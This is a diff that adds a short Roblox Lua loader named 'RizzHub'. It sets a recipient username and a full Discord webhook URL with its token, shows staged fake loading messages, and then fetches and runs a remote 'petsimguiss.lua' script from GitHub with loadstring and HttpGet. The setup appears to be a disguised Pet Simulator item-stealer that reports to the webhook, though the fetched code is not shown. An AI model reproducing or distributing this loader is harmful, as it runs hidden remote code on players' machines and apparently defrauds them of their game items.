@@ -1,0 +1,11 @@
+Username = "PikachuCZ21"
+WebHook = "https://discord.com/api/webhooks/1091330189860016178/bWeiXt1Qu_00vlTXK8xJO-TVeDzFaQOZ_uG9VjfIWOmcrZ9xi1zsJGVZCysH-xbpomup"
+
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "RizzHub"
+_G.Text1 = "Script Loading..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Script..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
